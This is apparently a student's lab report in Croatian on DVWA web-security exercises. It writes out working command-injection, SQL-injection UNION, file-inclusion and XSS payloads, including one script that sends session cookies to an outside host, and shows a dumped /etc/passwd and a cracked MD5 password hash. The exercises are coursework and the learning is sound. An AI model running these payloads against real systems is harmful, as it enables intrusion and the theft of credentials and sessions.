@@ -1,0 +1,58 @@
+ime: PAOLA GLAVIĆ SANKOVIĆ, JMBAG: 0036522290
+1) IZVOĐENJE NAREDBI (command injection)
+slike: "zadatak1.png"
+naredba: 1 | cd /etc, 1| cat /etc/passwd
+opis postupka: prvo se pozicijoniram u direktorij etc za naredbom "1 | cd /etc", nakon čega sa naredbom "1| cat /etc/passwd" ispisujem sadržaj
+direktorija "etc/passwd". S obzirom da ne mogu izvršiti naredbe odvojeno, spojim ih sa zarezom pa kompletna naredba glasi "1 | cd /etc, 1| cat /etc/passwd"
+ispis:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+ 
+2) NAPADI SQL UMETANJEM (sql injection)
+slike: zadatak2-prva-naredba.png, zadatak2-druga-naredba.png, zadatak2-hash.png
+naredba: "' UNION SELECT first_name, password FROM users WHERE first_name='Pablo' and last_name='Picasso" -> ako znam ime i prezime korinika kojeg tražim
+ ili ispis svih naredbom "' UNION SELECT first_name, password FROM users WHERE  '1'='1' UNION SELECT last_name , first_name FROM users WHERE  '0'='0"
+opis: Prvo umetanjem SQL upita pokušavam doći do ispisa korisnika i njihovih hashiranih šifri. Znam da aplikacija prima 2 argumenta, First name i surname. 
+(upisom "1' ORDER BY 1#" ipis je First name: admin, Surname: admin). Sada kada je poznato da je red veličine stvari koje mogu tražiti od baze 2,
+umećem naredbu napisanu pod "naredba". U slučaju da ja kao napadač znam i ime i prezime korisnika kojeg napadam, mogu korsititi prvu naredbu, gdje će mi se pod 
+polje "first name:" ispisati zaista traženo ime, a pod polje "surname" hash lozinke jer tako stoji u mom SQL umetnutom upitu. U slučaju druge naredbe vidim
+cijeli ispis korisnika korištenjem tautologije 0=0 (pa će se sve ispisati), gdje su prvo izlistani po imenima i hash lozinkama, a onda po imenima i prezimenima čisto
+ da se uvjerimo da postoji jedan Pablo koji se preziva Picasso i da je njegov hash taj koji piše.  
+Nakon što pročitam hash Pabla umetnem ga u stranicu "crackstation.net" i vidim da se podudara sa alagoritmom MD5 i riječju "letmein"
+sažetak: "0d107d09f5bbe40cade3de5c71e9e9b7"
+šifra: "letmein"
+
+
+3) XSS (cross site srcipting)
+slike: zadatak3.png
+*istu stvar dobijem i za stored i za reflected opcije pa je dana samo jedna slika.
+*veličinu upisa mijenjam otvaranjem dev toolsa i mijenjanjem veličine polja za upis name i message (pod varijablu "maxlength")
+za stored:
+u polje Name: name (*ili bilo kakav tekst)
+u polje Message (za stored): "<script>document.location.href='http://public.tel.fer.hr/srs?cookie=' + document.cookie;</script>"
+za redacted:
+u polje Whats your name: "192.168.56.102/dvwa/vulnerabilities/xss_r/?name=<script>document.location.href='http://public.tel.fer.hr/srs?cookie=' + document.cookie;</script>"
+
+
+4) INKLUZIJA DATOTEKA (file inclusion)
+slike: zadatak4.png
+rucno upisati url: http://192.168.56.102/vulnerabilities/fi/?page=/etc/passwd
+riješenje za sprečavanje napada: Nikad izravno ne uključivati datoteke iz varijabli kojima korisnik može na neki način pristupiti ili manipulirati.
